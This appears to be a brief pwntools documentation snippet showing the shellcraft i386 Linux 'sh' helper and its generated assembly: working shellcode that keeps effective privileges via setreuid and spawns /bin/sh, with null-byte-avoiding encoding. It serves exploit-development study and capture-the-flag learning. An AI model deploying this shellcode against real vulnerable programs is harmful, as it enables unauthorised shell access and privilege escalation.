
`p = run_assembly(shellcraft.i386.linux.sh())`


```
Help on function sh in module pwnlib.shellcraft.i386.linux:

sh()
    Execute a different process.

    >>> p = run_assembly(shellcraft.i386.linux.sh())
    >>> p.sendline(b'echo Hello')
    >>> p.recv()
    b'Hello\n'
```


```
    /*  geteuid */
    /* call geteuid() */
    push SYS_geteuid /* 0x31 */
    pop eax
    int 0x80
    mov ebx, eax

    /*  setreuid(eax, eax) */
    /* call setreuid('ebx', 'ebx') */
    push SYS_setreuid /* 0x46 */
    pop eax
    mov ecx, ebx
    int 0x80
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016972
    xor ecx, ecx
    push ecx /* null terminate */
    push 4
    pop ecx
    add ecx, esp
    push ecx /* 'sh\x00' */
    mov ecx, esp
    xor edx, edx
    /* call execve() */
    push SYS_execve /* 0xb */
    pop eax
    int 0x80
```